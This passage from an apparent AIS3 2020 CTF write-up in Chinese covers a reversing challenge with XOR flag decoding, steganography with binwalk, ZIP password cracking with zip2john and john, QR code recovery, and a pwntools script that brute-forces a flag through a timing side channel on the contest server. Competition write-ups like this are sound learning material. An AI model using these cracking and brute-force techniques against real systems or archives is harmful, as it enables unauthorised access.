class="mi">32</span><span class="p">,</span><span class="o">-</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="o">-</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="o">-</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="o">-</span><span class="mi">76</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="o">-</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="o">-</span><span class="mi">5</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">32</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="o">-</span><span class="mi">59</span><span class="p">,</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span><span class="o">-</span><span class="mi">5</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">32</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="mi">62</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">85</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">66</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">89</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">71</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">94</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">87</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">93</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">92</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">94</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">93</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">70</span><span class="p">]</span>
    <span class="n">notes</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="n">notes</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">notes</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="n">notes</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">notes</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">result</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">notes</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">notes</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">result</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="n">notes</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">constraints</span><span class="p">):</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,[</span><span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">notes</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">notes</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">secret</span><span class="p">))]))</span>
        <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="c1">#dis.dis(run)
</span><span class="n">run</span><span class="p">()</span>
</code></pre></div></div>

<p>我後來又卡了好幾個小時；我第一次沒有看出來這是 Fibonacci 數列。邏輯有時候頗爛然後對數字沒什麼感覺。總之，最後是有資科系同學剛好在我身旁看到推了我一把才看懂。最後推出來所有的按鍵應該是 <code class="language-plaintext highlighter-rouge">lloolloolloo[;lolloolloolloo[;lolloolloolloo[;lolloojjhhjjhh lloolloolloo[;lolloolloolloojol;[[lloollhhhh-hjol;[[lloollgg</code>. 最後播完噴 Flag。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/38IF3XJ.png" alt="" /></p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan}</code></p>

<h2 id="misc">Misc</h2>

<h3 id="-piquero-100-pt">💤 Piquero (100 pt.)</h3>

<p><img src="/assets/images/posts/ais3-2020-writeup/2dA2K5Q.jpg" alt="" /></p>

<p><img src="/assets/images/posts/ais3-2020-writeup/jQHwDD4.jpg" alt="" /></p>

<!-- 我一開始看到這題的時候內心覺得主辦在搞我們。!-->

<p>這題就很無腦的照著點字透過像是 decode.fr 慢慢解。沒有留 Flag。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/GV8ZvhF.png" alt="" /></p>

<h3 id="-karuego-100-pt">🐥 Karuego (100 pt.)</h3>

<p>這種只有圖片的題目不外乎是藏在 EXIF 不然就是藏在這張照片的某個區段，所以我們先用 <code class="language-plaintext highlighter-rouge">binwalk</code> 檢查。</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ binwalk Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
0             0x0             PNG image, 2880 x 1492, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, compressed
2059568       0x1F6D30        Zip archive data, at least v1.0 to extract, name: files/
2059632       0x1F6D70        Zip archive data, encrypted at least v2.0 to extract, compressed size: 113020, uncompressed size: 113110, name: files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg
2172779       0x21276B        Zip archive data, encrypted at least v2.0 to extract, compressed size: 1087747, uncompressed size: 1092860, name: files/Demon.png
3260899       0x31C1E3        End of Zip archive, footer length: 22
</code></pre></div></div>

<p>看起來的確是有藏東西，我們用 <code class="language-plaintext highlighter-rouge">-e</code> 拉出來看看吧，最後我們發現裡面有一個ZIP檔。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/0y8L2ah.png" alt="" /></p>

<p>很可惜的，沒那麼簡單。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/DVuodd0.png" alt="" /></p>

<p>這時候就得搬出 John the Ripper 囉！John the Ripper中的 <code class="language-plaintext highlighter-rouge">zip2john</code> 可以幫助我們撈出這個 ZIP file 的所有 Hash，接著就可以透過 <code class="language-plaintext highlighter-rouge">john</code> 來進行 dictionary attack。</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ zip2john.exe .<span class="se">\1</span>F6D30.zip <span class="o">&gt;</span> out.hash
</code></pre></div></div>

<p><img src="/assets/images/posts/ais3-2020-writeup/fBUnrle.jpg" alt="" /></p>

<p>我們撈出 Hash 之後就可以塞給 <code class="language-plaintext highlighter-rouge">john</code> 幫我們做事了！</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john.exe out.hash
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 24 OpenMP threads
Proceeding with single, rules:Single
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Almost <span class="k">done</span>: Processing the remaining buffered candidate passwords, <span class="k">if </span>any.
Warning: Only 4 candidates buffered <span class="k">for </span>the current salt, minimum 24 needed <span class="k">for </span>performance.
Proceeding with wordlist:/run/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
lafire           <span class="o">(</span>1F6D30.zip<span class="o">)</span>
1g 0:00:00:14 DONE 3/3 <span class="o">(</span>2020-06-20 01:48<span class="o">)</span> 0.06757g/s 6074Kp/s 6074Kc/s 6074KC/s 2tzbr1..lirono
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>

<p>出來之後我們就知道這個 zip 的密碼是 <code class="language-plaintext highlighter-rouge">lafire</code>，這時就可以去開 Flag 了。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/Y2lzuXE.png" alt="" /></p>

<h3 id="-soy-139-pt">🌱 Soy (139 pt.)</h3>

<p><img src="/assets/images/posts/ais3-2020-writeup/yCCp9U3.png" alt="" /></p>

<p>這題是 QR Code recovery，最近<a href="https://hsctf.com/">大家似乎都很喜歡考這題</a>。很可惜的，QRazyBox 不是很喜歡這種被蓋掉重要部份的 QR Code。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/ODAaW8P.png" alt="" /></p>

<p>這時候就得人工介入了，我們依部份黑點可以隱約看出哪部分有可能是黑的或白的。我們可以透過 Brightness &amp; Contrast 調整幫助 QRazyBox 辨識。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/FwLVG94.png" alt="" /></p>

<p><img src="/assets/images/posts/ais3-2020-writeup/VTM1LQX.png" alt="" /></p>

<p>接著我們在人工把 Position 部分跟 Finder 加回去。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/rWkRJAw.png" alt="" /></p>

<p>這時候丟進 QRazyBox 就好了。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/gEJgFlK.png" alt="" /></p>

<p>接著我們可以強制要求 QRazyBox 把讀得出來的東西拉出來。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/4WdIisY.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QR version : 2 (25x25)
Error correction level : L
Mask pattern : 0
Number of missing bytes (erasures) : 0 bytes (0.00%)
Data blocks :
["01000010","00000100","00010100","10010101","00110011","00110111","10110100","10000011","00000111","01110101","11110110","00110011","01000110","11100101","11110111","10010011","00000111","01010101","11110110","01100011","00010110","11100110","01000101","11110110","11010110","01010011","11110010","00010011","11110010","00010011","11110010","00010010","00010110","11010000","00101111","11010001","11110100","11011010","10001110","10110011","11010101","00100100","11011101","00110011"]
Final data bits :
01000010000001000001010010010101001100110011011110110100100000110000011101110101111101100011001101000110111001011111011110010011000001110101010111110110011000110001011011100110010001011111011011010110010100111111001000010011111100100001001111110010000100100001011011010000
[0100] [00100000] [0100000101001001001010010100110010011001101101111011010010010000010011000001101110111010010111110110110001100100110100011011011100100101111101101111001001001100000110111010101001011111011011001100010011000101101101110011011001000100101111101101101101011011001010010011111100100100001001001111110010010000100100111111001001000010010010000101101101101000]
Mode Indicator : 8-bit Mode (0100)
Character Count Indicator : 32
Decoded data : AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!m
Final Decoded string : AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!m
</code></pre></div></div>

<p>這時我們就可以猜出Flag了。</p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}</code></p>

<h3 id="-saburo-359-pt">👑 Saburo (359 pt.)</h3>

<p>這題純粹用 pwntools 一直暴力戳對方伺服器，開了一堆 Pool 狂戳。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">remote</span>
<span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">printable</span>
<span class="kn">from</span> <span class="nn">multiprocessing</span> <span class="kn">import</span> <span class="n">Pool</span><span class="p">,</span> <span class="n">Array</span><span class="p">,</span> <span class="n">Manager</span>
<span class="kn">from</span> <span class="nn">traceback</span> <span class="kn">import</span> <span class="n">print_exception</span>

<span class="k">def</span> <span class="nf">handle_error</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
    <span class="n">print_exception</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="n">e</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">__traceback__</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_range</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
    <span class="n">Min</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="s">"inf"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
        <span class="k">with</span> <span class="n">remote</span><span class="p">(</span><span class="s">"60.250.197.227"</span><span class="p">,</span> <span class="mi">11001</span><span class="p">)</span> <span class="k">as</span> <span class="n">r</span><span class="p">:</span>
            <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
            <span class="n">rep</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
            <span class="k">if</span> <span class="s">"lose"</span> <span class="ow">in</span> <span class="n">rep</span><span class="p">:</span>
                <span class="n">sec</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">rep</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">5</span><span class="p">])</span>
                <span class="n">Min</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">Min</span><span class="p">,</span> <span class="n">sec</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">cur_min</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">Min</span>

<span class="n">doc</span> <span class="o">=</span> <span class="s">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?_{}"</span>
<span class="n">ans</span> <span class="o">=</span> <span class="s">"AIS3{A1r1ght_U_4r3_my_3n3"</span>
<span class="n">cur_min</span> <span class="o">=</span> <span class="n">Manager</span><span class="p">().</span><span class="nb">list</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">doc</span><span class="p">)))))</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">Pool</span><span class="p">(</span><span class="n">processes</span><span class="o">=</span><span class="mi">16</span><span class="p">,</span> <span class="n">maxtasksperchild</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">doc</span><span class="p">)):</span>
        <span class="n">p</span><span class="p">.</span><span class="n">apply_async</span><span class="p">(</span><span class="n">get_range</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">ans</span><span class="o">+</span><span class="n">doc</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">i</span><span class="p">),</span> <span class="n">error_callback</span><span class="o">=</span><span class="n">handle_error</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
    <span class="n">cur_min</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">cur_min</span><span class="p">)</span>
    <span class="n">ans</span> <span class="o">+=</span> <span class="n">doc</span><span class="p">[</span><span class="n">cur_min</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="nb">max</span><span class="p">(</span><span class="n">cur_min</span><span class="p">))]</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n\n</span><span class="si">{</span><span class="n">ans</span><span class="si">}</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"./Saburo_ans2"</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">ans</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    
